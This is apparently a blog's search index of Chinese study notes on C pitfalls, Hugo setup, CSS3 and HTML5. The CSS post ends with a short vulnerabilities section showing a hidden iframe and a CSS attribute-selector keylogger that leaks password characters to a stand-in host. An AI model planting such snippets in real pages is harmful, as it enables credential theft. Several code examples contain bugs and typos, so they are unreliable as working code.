-\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned long -\u0026gt; long long -\u0026gt; unsigned long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double; 赋值表达式: 右值转换为左值; 函数传参: 实参转换为形参; 函数返回值: 表达式转换为返回值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; int main(){ int i = 0; unsigned int ui = 0; long l = 1; long long ll = 2; float f = 0.1f; double d = 0.2f; printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(i+l),sizeof(l)); printf(\u0026#34;%llu %llu %llu \\n\u0026#34;,sizeof(l+ll),sizeof(ui+ll),sizeof(ll)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(ll*f),sizeof(f)); printf(\u0026#34;%llu %llu\\n\u0026#34;,sizeof(f+d),sizeof(d)); short s = d*ll; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(s)); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; double func(int a){ printf(\u0026#34;%llu\\n\u0026#34;,sizeof(a)); return a; } int main(){ double a = 2.9f; printf(\u0026#34;%llu\\n\u0026#34;,sizeof(func(a))); printf(\u0026#34;%f\u0026#34;, func(a)); return 0; } 强制类型转换: (类型名) 表达式\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 17, b = 5; double c = a/b; double d = (double)a/b; printf(\u0026#34;%f %f\u0026#34;,c,d); return 0; } 应用: 模平方时防止越界\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 104560; int m = 1307; int b = (a*a)%m; int c = (1LL*a*a)%m; int d = ((long long)a*a)%m; printf(\u0026#34;%d %d %d\u0026#34;,b,c,d); return 0; } 内存对齐 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; char ch; int i; short s; double d; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); printf(\u0026#34;%llu\\n\u0026#34;, sizeof(ch)+ sizeof(ch)+ sizeof(i)+ sizeof(s)+ sizeof(d)); return 0; } 发现结构体内部变量占用空间加起来仅为16个字节, 但结构体占用24个字节, 这就涉及到结构体的内存对齐.\nchar占用1字节, 对齐到1的倍数; int占用4字节, 对齐到4的倍数; double占用8字节, 对齐到8的倍数. 尽管内存以字节为基本单位, 但CPU会以4字节, 8字节, 甚至16字节进行访问; 在没有对齐机制时, 访问到正确的变量位置需要额外操作. 内存对齐系数由编译器决定, 结构体占用内存为对齐系数倍数. GCC和MSVC中默认对齐系数均为4, 可以通过预编译\u0026rdquo;#pragma pack(n)\u0026ldquo;来改变.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #pragma pack(2) int main(){ typedef struct { char sch1; char sch2; int si; short ss; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 但通常不建议改变对齐系数, 为了使结构体占用更小内存, 应当将占用较小的变量统一排在前面, 如将上述结构体修改为:\n1 2 3 4 5 6 7 8 9 10 11 int main(){ typedef struct { char sch1; char sch2; short ss; int si; double sd; } Align; printf(\u0026#34;%llu\\n\u0026#34;, sizeof(Align)); return 0; } 深入理解指针 声明变量时, 如\u0026quot;int a;\u0026rdquo;, 在运行时会为变量a开辟一块内存空间, 但值不能确定. 用scanf写入时, 用\u0026rdquo;\u0026amp;a\u0026quot;表示写入到变量a所在的地址. 地址的数据类型即为指针类型, 即指针类型的变量存放的数据为内存地址.\n数据类型包含两个信息: 内存占用大小; 读写时遵循的规则. 定义一个指针类型时, 还需要给出指向的数据类型. 这是因为指针仅指向一个内存单元, 也就是CPU读写的起始位置(小端序下的数据低位); 只有给出指向的数据类型, CPU才能知道读写的终止位置和读写遵循的规则.\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main(){ long long a = 0x0A0B0C0D; long long* p1 = \u0026amp;a; int* p2 = \u0026amp;a; // 在本行打断点调试, 在CLion或VS的Memory View中输入\u0026amp;a查看内存位置, 并对比Threads \u0026amp; Variables中p1,p2的值 return 0; } 此外, 指针类型的占用空间取决于CPU寻址方式, 与指向的数据类型无关.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; int main(){ char a; short b; int c; double d; char *pa = \u0026amp;a; short *pb = \u0026amp;b; int *pc = \u0026amp;c; double *pd = \u0026amp;d; printf(\u0026#34;%llu %llu %llu %llu\u0026#34;,sizeof(pa),sizeof(pb),sizeof(pc),sizeof(pd)); return 0; } 无歧义地, 指针类型和指针类型变量均简称为指针.\n1 2 3 4 // 指针存放的是地址, 以下显然是合法的. int a; int *p = \u0026amp;a; scanf(\u0026#34;%d\u0026#34;,p); 显然\u0026quot;int **p\u0026quot;意为指向\u0026quot;int *\u0026ldquo;类型的指针, \u0026ldquo;int ***p\u0026quot;意为指向\u0026quot;int **\u0026ldquo;类型的指针. \u0026ldquo;*p\u0026quot;含义为解引用, 即读写指针p指向的内存.\n在使用指针时, 应当避免出现野指针, 即指向非法内存的指针.\n1 2 3 // 使用未初始化的指针 int *p; printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 // 释放指针后未置空 int *p = (int*)malloc(sizeof(int)); free(p); printf(\u0026#34;%d\u0026#34;,*p); 1 2 3 4 5 6 7 8 9 // 指向对象已消亡(超出变量作用域) int *Address(void){ int a = 10; return \u0026amp;a; } void getAddress(void){ int *p = Address(); printf(\u0026#34;%d\u0026#34;,*p); } 1 2 3 4 5 // 指针赋值为无法读取的内存 int *p = (int *) 0x100000; printf(\u0026#34;%d\u0026#34;,*p); // Windows进程内存空间地址从0x400000开始 // 但考虑到平台不同时进程起始位置不同, 通常不建议赋值为具体地址 指针也可以进行加减运算, 含义为指向前后的内存, 移动单位取决于指向的数据类型.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; int main(){ double a = 0.0f; double *p = \u0026amp;a; printf(\u0026#34;%u %u %u %llu\u0026#34;,p-1,p,p+1,sizeof(a)); return 0; } 数组是连续的内存, 由此想到可以通过数组指针来调用数组, 同时数组变量名本质上也是指针.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; int main(){ int array[] = {0,1,2,3}; int *p = array; printf(\u0026#34;%d %d %d %d %d\\n\u0026#34;,array[2],p[2],*(p+2),*(array+2),2[array]); // 考虑到可读性, 仅推荐array[2]和p[2]两种调用方式. int arr[4][2] = {0}; printf(\u0026#34;%x,%x\u0026#34;,\u0026amp;arr[3][1],*(arr+3)+1); // C中二维数组行优先. return 0; } 指针自然也可以作为函数参数. 调用函数赋值时, 如\u0026quot;int a = func(b);\u0026rdquo;, CPU将函数返回值复制到寄存器中, 再将寄存器中的数据复制到要改变的变量, 这一过程也就体现为变量的作用域. C可以返回结构体, 同时无法直接返回数组, 不使用指针时可以将数组包含在结构体中; 而若直接返回结构体, 结构体由于本身占用较大, 复制两次导致性能开销过大. 此时, 可以在函数外声明结构体或数组, 并将指向结构体的指针或数组传入.\n函数也存在地址, 自然也可以有指向函数的指针. 但声明函数指针时, 运算优先级问题往往让人感到困惑: 如参数列表\u0026rdquo;()\u0026ldquo;的优先级高于\u0026rdquo;*\u0026rdquo;. 在分析函数声明时, 可以借助网站: https://cdecl.org/.\n逻辑短路 对于逻辑运算符与\u0026rdquo;\u0026amp;\u0026amp;\u0026ldquo;和或\u0026rdquo;||\u0026ldquo;存在短路规则, \u0026ldquo;\u0026amp;\u0026amp;\u0026ldquo;前若已为假则忽略后续直接返回\u0026quot;fasle\u0026rdquo;, 同理\u0026rdquo;||\u0026ldquo;前若已为真则忽略后续直接返回\u0026quot;true\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; int main(){ int a = 0, b = 1, c = 10, f, t; f = a \u0026amp;\u0026amp; (b - ++c); t = b || (a - c++); printf(\u0026#34;%d\\n\u0026#34;,c); f = b \u0026amp;\u0026amp; (a - ++c); t = a || (b - c++); printf(\u0026#34;%d\\n\u0026#34;,c); return 0; } 运算优先级上, \u0026ldquo;()\u0026ldquo;和\u0026rdquo;++\u0026ldquo;都高于\u0026rdquo;\u0026amp;\u0026amp;\u0026ldquo;和\u0026rdquo;||\u0026rdquo;, 但第一次f和t赋值中有副作用的\u0026rdquo;++\u0026ldquo;一次也没有被执行, 第二次中都被执行了.\n内存溢出和内存泄漏 内存溢出指申请空间没有足够的空间可以使用, 如声明\u0026quot;int\u0026quot;类型变量, 但赋值了超出\u0026quot;int\u0026quot;类型的数.\n内存泄漏指申请使用内存后, 无法释放已经申请的内存空间; 内存泄漏累积就会造成内存溢出. (在某些优化较差的游戏中, 如刺客信条: 大革命, 游玩时会突然卡死, 打开任务管理器发现内存占用率100%, 可能就是遇到了内存泄漏问题.) 对于个人用户, 内存泄漏也许不严重, 结束程序进程时会释放所有已分配的内存; 但对于服务器, 某些程序需要一直保持运行, 内存泄漏会不断累积并造成严重后果.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 比较低级的错误: 分配的内存使用完后没有释放 // 指针重新赋值时, 原指向位置丢失 int *p = (int *)malloc(sizeof(int)); int *np = (int *)malloc(sizeof(int)); p = np; // 内存释放时, 造成位置孤立 head -\u0026gt; next = node; free(head); // 分配了没有指针指向的内存 int *memory(){ return (int *)malloc(sizeof(int)); } void lost(){ memory(); } 防止内存泄漏的核心思想是: 进行任何内存有关的操作时, 始终确保每个已分配的内存都有指针指向.\n数组 有时在声明数组时无法确定数组长度, 需要传入参数.\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; int main(){ int n = 3; int a[n]; return 0; } GCC可以编译通过; 但MSVC不支持变长数组, 会报错. 可以考虑用内存分配函数实现, 调用方式同数组.\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(){ int n = 3; int *a = (int*)malloc(n*sizeof(int)); a[0] = 1; printf(\u0026#34;%d\u0026#34;,a[0]); free(a); a = NULL; return 0; } C中二维数组按行存储, 故声明和传参时, 第二维度不可省略.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int arr1[][3] = {{0, 1, 2}, {3, 4, 5}}; // 合法 int arr2[2][] = {{0, 1, 2}, {3, 4, 5}}; // 非法 int n = 3; int arr1[][n] = {{0, 1, 2}, {3, 4, 5}}; // 同样GCC支持, MSVC不支持 #define MAXSIZE 10 void func(int arr[][MAXSIZE], int n, int m); // 合法 void func(int (*arr)[MAXSIZE], int n, int m); // 合法 void func(int arr[][], int n, int m); // 非法 void func(int arr[MAXSIZE][], int n, int m); // 非法 void func(int n, int m, int arr[n][m]); // 同样GCC支持, MSVC不支持 // 更多非法情况不一一列举 二维数组声明为\u0026quot;arr[][n]\u0026ldquo;时, arr[i][j] 的地址为\u0026rdquo;\u0026amp;arr[0][0]+n*i+j\u0026rdquo;; 而\u0026quot;arr\u0026quot;实际为指向 $n$ 块连续内存的指针.\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { int arr[2][3] = {{0, 1, 2}, {3, 4, 5}}; int (*p)[3] = arr; // []的优先级高于*, 如写为*p[3]意为元素为指针的数组, 而非指向二维数组的指针 printf(\u0026#34;%x %x %x %x\u0026#34;,sizeof(int),sizeof(*p),arr,arr+1); int *q = \u0026amp;arr[0][0]; // 比较和指针p的区别 printf(\u0026#34;%x %x %x %x\\n\u0026#34;,\u0026amp;arr[1][1],*(arr+1)+1,*(p+1)+1,q+1*3+1); // 四种方式得到的地址相同 return 0; } 在需要频繁使用动态二维数组时, 由于二维数组传参经常令人疑惑, 推荐使用一维数组模拟, 或如下方式:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int** declare(int n, int m) { int** arr = (int**)malloc(sizeof(int*) * (n)); for(int i = 0; i \u0026lt; n; ++i) { arr[i] = (int*)malloc(sizeof(int) * (m)); } return arr; } void init(int** arr, int n, int m) { for(int i = 0; i \u0026lt; n; ++i) { for(int j = 0; i \u0026lt; m; ++j) { arr[i][j] = 0; } } } int main() { int n,m; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m); // 声明二维数组 int** arr = declare(n, m); // 初始化二维数组 init(arr, n, m); return 0; } C风格字符串 C风格的字符串必须以\u0026rsquo;\\0\u0026rsquo;(即NULL或0)结尾. 本质为一个指向连续内存的头指针, 并以\u0026rsquo;\\0\u0026rsquo;标志结尾. 必要时可以再设置一个尾指针, 指向结尾处的\u0026rsquo;\\0'.\n1 2 3 // 声明字符串: 初始化 char *str[1000] = \u0026#34;\u0026#34;; char *str = (char*)calloc(1000, 1); 但使用\u0026lt;string.h\u0026gt;库中的\u0026quot;strlen()\u0026ldquo;函数时, 返回的是字符串的有效长度: 如在第n-1位遇到NULL, 则返回n.\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ char a[20] = \u0026#34;string\u0026#34;; printf(\u0026#34;%llu\u0026#34;,strlen(a)); return 0; } 若用\u0026quot;strlen()\u0026ldquo;得到其他字符串输出时, 想要得到相同有效长度的字符串需要声明长度为\u0026quot;strlen(string)+1\u0026rdquo;. 尽管不以\u0026quot;NULL\u0026quot;结尾有时不会得到错误的输出, 但应当避免不规范的使用. 仅以字符串值声明字符串时, 编译器会默认在结尾添加\u0026quot;NULL\u0026rdquo;, 无论字符串值末尾是否有\u0026rdquo;\\0\u0026quot;.\n1 2 3 4 5 int main(){ char str[] = \u0026#34;C is the best language!\\0\u0026#34;; // 此处打断点调试, 发现字符串长度为25, 但有效字符只有23个, 最后两个均为\u0026#34;NULL\u0026#34;. return 0; } 1 2 3 4 5 6 // 读入字符串(常用) scanf(\u0026#34;%s\u0026#34;, str); // 遇到空白符(如\u0026#34; \u0026#34;\u0026#34;\\r\u0026#34;\u0026#34;\\n\u0026#34;等)会停止读入, 不会读入空白符. scanf(%[^\\n], str); // 读到\u0026#34;\\n\u0026#34;时才停止读入, 不会读入\u0026#34;\\n\u0026#34;, 本质为正则表达式. fgets(str, size, stdin); // 读到\u0026#34;\\n\u0026#34;时停止读入, 但会读入\u0026#34;\\n\u0026#34;. char *ch = str; while((*ch = getchar()) != \u0026#39;\\n\u0026#39;) ++ch; *ch = \u0026#39;\\0\u0026#39;; // 手动逐字符读入. gets(str); // 不安全的函数, 已被C11取消支持, NOJ禁用. 1 2 3 4 // 输出字符串(常用) fputs(str, stdout); // 输出直到遇到\u0026#34;\\0\u0026#34;. printf(\u0026#34;%s\u0026#34;, str); // 输出直到遇到\u0026#34;\\0\u0026#34;. puts(str); //不推荐的函数, NOJ偶尔无法使用. 1 2 3 4 5 6 7 8 9 10 // 字符操作函数(常用) #include \u0026lt;ctype.h\u0026gt; int isalnum(int c) // 数字或字母 int isalpha(int c) // 字母 int isprint(int c) // 可打印函数 int islower(int c) // 小写字母 int isupper(int c) // 大写字母 int isxdigit(int c) // 十六进制数字 int tolower(int c) // 转换为小写字母 int toupper(int c) // 转换为大写字母 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 字符串操作函数(常用) // 为避免内存泄漏和野指针问题, 通常只能对开在栈上字符串使用, 而不能对开在堆上的字符串使用 # include \u0026lt;string.h\u0026gt; // 失败时均返回NULL void *memset(void *str, int c, size_t n); // 复制字符c到str的前n个字符. // 使用memset对数组初始化时, 字符c只能为0或-1或0x3f. void *memcpy(void *dest, const void *src, size_t n); // 从src复制n个字符到dest, 一般不用于src和dest内存重叠的情况. void *memmove(void *dest, const void *src, size_t n); // 从src复制n个字符到dest, src和dest内存重叠时推荐使用. size_t strlen(const char *str); // 返回str长度, 即头指针到\u0026#39;\\0\u0026#39;的距离(但不包含\u0026#39;\\0\u0026#39;). char *strcat(char *dest, const char *src); // 将src追加到dest结尾. char *strchr(const char *str, int c); // 返回str中第一次出现字符c的位置. char *strstr(const char *haystack, const char *needle); // 返回在haystack中第一次出现needle的起始位置. size_t strspn(const char *str1, const char *str2); // str1中第一个不在str2出现的字符的下标 char *strtok(char *str, const char *delim); // 以delim为分隔, 分解str. 未定义行为 C 标准中没有定义的实现, 造成的后果是难以预料的. 使用未定义行为时, 由于优化编译器可能并不会发出警告; 目前没有可靠的办法很好检查代码中是否使用了未定义行为; 根本原因在于 C 并非一种安全的语言; 在编写过程中应当避免使用未定义行为.\n主要的未定义行为如下: 使用未初始化的变量; 有符号整型溢出; 过大的位移量; 解引用野指针或数组越界访问; 解引用空指针; 违反类型规则; 违反求值顺序规则.\n参考: Chris Lattner, What Every C Programmer Should Know About Undefined Behavior.\n待更新内容: 聚合体与字节序, 按位运算妙用, 不安全函数, 宏函数, 变长参数, 线程\n","date":"2023-09-16T00:00:00Z","permalink":"https://example.com/p/c%E6%9D%82%E8%B0%88/","title":"C杂谈"},{"content":"PREPARATION git download hugo download Check git \u0026amp; hugo added in the environment variables (Windows).\nThe following steps are in Bash.\n1 2 git version hugo version ON PREMISES 1 2 3 4 5 6 hugo new site blog cd blog git clone https://themeName themes/themeName cp themes/themeName/exampleSite/* ./ -r rm hugo.toml hugo server FIRST COMMIT Github Create Repositoriy: username.github.io\n1 2 3 4 5 6 7 hugo cd public git init git remote add origin https://github.com/username/username.github.io.git git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master LATER COMMIT 1 2 3 4 5 6 hugo cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push KATEX CONFUSION display obsidian hugo newline \\\\ \\\\\\ % \\% \\\\% suffix { }_ { }\\_ * * \\* { \\{ \\\\{ ","date":"2023-09-14T00:00:00Z","permalink":"https://example.com/p/hugo%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"hugo快速入门"},{"content":"Cascading Style Sheets\n基本结构 1 selector, ... {property:value; ... } 继承: Netscape4不支持 格式化: 块级元素, 行内元素\n多重样式 更详细定义 - 继承 重复定义 - 优先级: 同级别下权重大, 同权重下后定义 !important 1-0-0-0-0 内联 1-0-0-0 1 \u0026lt;tag style=\u0026#34;property:value;...\u0026#34;\u0026gt; id选择器 1-0-0 1 #id {property:value; ... } class选择器 0-1-0 1 .class {property:value; ... } property选择器 0-1-0 1 [property=\u0026#34;value\u0026#34;] {property:value; ... } ~= 包含值(完整) |= 以值开头(完整) ^= 匹配以值开头 $= 匹配以值结尾 *= 匹配值\n伪类(pseudo class) 0-1-0 1 :pseudo_class {property:value; ... } active, checked, disabled, empty, enabled, first-child, first-of-type, focus, hover, in-range, invalid, lang, last-child, last-of-type, link, nth-child(n), nth-last-child(n), nth-last-of-type(n), nth-of-type(n), only-of-type, only-child, option, out-of-range, read-only, read-write, required, root, target, valid, visited\ntag选择器 0-0-1 1 tag {property:value; ... } 伪元素(pseudo element) 0-0-1 1 ::pseudo_element {property:value; ... } after, before, first-letter, first-line, selection\n通配符* 关系符, + \u0026gt; ~ \u0026quot;\u0026quot; | | 否定符:not( ) 0-0-0 分组 tag,tag 共同样式 后代 tag tag 包含元素 父子 tag\u0026gt;tag 仅限子元素 相邻 tag+tag 仅对紧邻元素 外部链接 1 2 3 \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;文件名.css\u0026#34;\u0026gt; \u0026lt;\\head\u0026gt; 常用属性 背景: background, -attachment (scroll; fixed; local; initial; inherit), -color, -image, -position, -repeat, -clip, -origin (padding-box; border-box; content-box), -size 字体: @font-face (font-family; src); font, -family, -size, -style (normal; italic; oblique), -variant (normal; small-caps), -weight 文本: color, direction (ltr; rtl), letter-space, line-height, vertical-align, white-space; text-align (left; right; center; justify), -decoration (none; underline; overline; line-through; blink), -indent, -transform (none; capitalize; uppercase; lowercase), -overflow (clip; ellipsis; string), -shadow; word-spacing, -break (normal; break-all; keep-all), -wrap 分页: page-break-after, -before, -inside (auto; always; avoid; left; right) 定位: position (absolute; fixed; relative; static; sticky), bottom, left, right, top, clear (left; right; both; none), clip (shape; auto), cursor (url; default; auto; crosshair; pointer; move; text; wait; help; \u0026hellip;), display (absolute; fixed; relative; static; sticky), float (left; right; none), overflow (visible; hidden; scroll; auto), visibility (visible; hidden; collapse), z-index 网络: grid-column, grid-row Box: box, -shadow, -sizing; overflow, -x/y (no-display; no-content); opacity 外边距: margin, -left/right/top/bottom 轮廓: outline, -color/style/width 边框: border, -left/right/top/bottom, - -color/style/width, -radius 内边距: padding, -left/right/top/bottom 内容: height/width, max/min-height/width 弹性: flex, -grow, -shrink, -basis, -flow, -direction; align, -content, -items (stretch; center; flex-start; flex-end; baseline), -self (space-between; space-evenly; space-around); justify-content, order 列表: list-style, -image, -position (outside; inside), -type (none; disc; circle; squre; decimal; lower-roman; upper-alpha; \u0026hellip;) 多列: columns, conlumn-count, -fill, -gap, -span, -width, -rule, - -color/style/width 表格: border-collapse, -spacing, caption-side, empty-cells, table-layout 生成: content (none; normal; counter; attr; string; open-quote; close-quote; no-open-quote; no-close-quote; url), -increment, -reset; quotes 动画: @keyframes; animation, -name, -duration, -timing-funcion, -delay, -iteration-count, -direction, -play-state 过渡: transition, -property, -duration, -timing-function, -delay 实例: 简单表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录界面\u0026lt;\\title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;login.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;用户登录\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;密码\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;登录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 body { font-family: Arial, sans-serif; } .container { width: 300px; margin: 0 auto; margin-top: 100px; } h1 { text-align: center; } form { margin-top: 30px; } input[type=text] input[type=password] input[type=submit] { display: block; width: 100% padding: 10px margin-bottom: 10xp; } button[type=submit] { background-color: #4CAF50; color: white; } #message { text-align: center; margin-top: 15px; font-weight: bold; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 document.getElementById(\u0026#39;loginForm\u0026#39;).addEventListerner(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); var username = document.getElementById(\u0026#39;username\u0026#39;).value; var password = document.getElementById(\u0026#39;password\u0026#39;).value; var data = { username: username, password: password }; fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;PUT\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(function(response) { return responce.text(); }) .then(function(message) { document.getElementById(\u0026#39;message\u0026#39;).textContent = message; }) .catch(function(error) { console.log(error); }) }); 潜在漏洞 iframe transparent 1 \u0026lt;iframe src=\u0026#34;URL\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; keylogger 1 2 3 4 5 \u0026lt;style\u0026gt; input[type=\u0026#34;password\u0026#34;][value$=\u0026#34;a\u0026#34;] { backgroud-image: url(\u0026#34;http//localhost:3000/a\u0026#34;); } \u0026lt;/style\u0026gt; ","date":"2023-08-25T00:00:00Z","permalink":"https://example.com/p/css3/","title":"CSS3"},{"content":"HyperText Markup Language\n基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!doctype html\u0026gt; \u0026lt;!-- 声明为html5文件 --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- html内容 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- 头部元素: 标题, 元数据, 脚本, 样式， icon, 关系 --\u0026gt; \u0026lt;title\u0026gt; \u0026lt;!-- html5中标题必需 --\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 可见页面内容: 段落, 表单, 链接, 格式, 样式, 程序, 列表, 表格, 框架, 多媒体--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 元素(element): 1 \u0026lt;begin_tag property=\u0026#34;value\u0026#34;; ...\u0026gt; content \u0026lt;/end_tag\u0026gt; 空元素(empty) 1 \u0026lt;tag property=\u0026#34;value\u0026#34;; ... /\u0026gt; 小写文件名, 完整后缀.html 常用标签 基础: !DOCTYPE, html, head, title, body, h1, \u0026hellip;, h6, p, br, hr, !\u0026ndash;\u0026hellip;\u0026ndash; 格式: abbr, b, cite, code, del, i, q, s, small, sup, sub, template, time, u, var, wbr 表单: form, input, textarea, button, select, optgroup, option, label, fieldset, legend, datalist, output 框架: iframe 图像: img, map, area, canvas, figcaption, figure, svg 音视频: audio, source, video 链接: a, link 列表: ul, ol, li, dt, dd 表格: table, caption, th, tr, td, thead, tbody, tfoot, col, colgroup 语义: style, div, span, header, nav, section, article, aside, footer,details, dialog, summary 元信息: base, meta 程序: script, noscript, embed, object 常用属性 全局: class, contenteditable, data-*, dir, draggable, hidden, id, lang, spellcheck, style, tabindex, title html: manifest del: cite, datetime time: datetime form: accept-charset, action, autocomplete (on; off), enctype (application/x-www-form-urlencoded; multipart/form-data; text/plain), method (get; post), name, target (_blank; _parent; _self; _top) input: accept, alt, autocomplete, autofocus, checked, disabled, formaction, formenctype, formmethod, formtarget, height, maxlength, multiple, name, readonly, required, size, src, type (button; checkbox; color; date; datetime; datetime-local; email; file; hidden; image; month; number; password; radio; range; reset; search; submit; tel; text; time; url; week), value, width textarea: autofocus, cols, disabled, maxlength, name, readonly, required, rows, wrap button: autofocus, disabled, formaction, formenctype, formmethod, formtarget, name, type (button; reset; submit), value select: autofocus, disabled, multiple, name, required, size optgroup: disabled, label option: disabled, label, selected, value lable: for iframe: height, name, src, width img: loading (eager; lazy), alt, height, ismap, src, usemap, width area: alt, coords, href, hreflang, media, rel, shape (default; rect; circle; poly), target, type (MIME) canvas: height, width svg: height, width, xmlns (http://www.w3.org/2000/svg), version (1.1; 1.2; 2.0) audio: autoplay, controls, loop, src source: src, type, srcset video: autoplay, controls, height, loop, muted, poster, src, width a: download, href, hreflang, media, rel (altrenate; author; bookmark; help; license; next; nofollow; noreference; prefetch; prev; search; tag), target, type link: href, hreflang, media, rel, type th: colspan, headers, rowspan, scope (col; colgroup; row; rowgroup) td: colspan, headers, rowspan col: span colgroup: span base: href, target meta: charset, content, http-equiv, name script: async, charset, defer, src, type embed: height, src, type, width object: data, height, name, type, usemap, width 字符集 ASCII, utf-8, ISO-8859-1, URL, 实体符号, ISO-639-1\n","date":"2023-08-20T00:00:00Z","permalink":"https://example.com/p/html5/","title":"HTML5"}]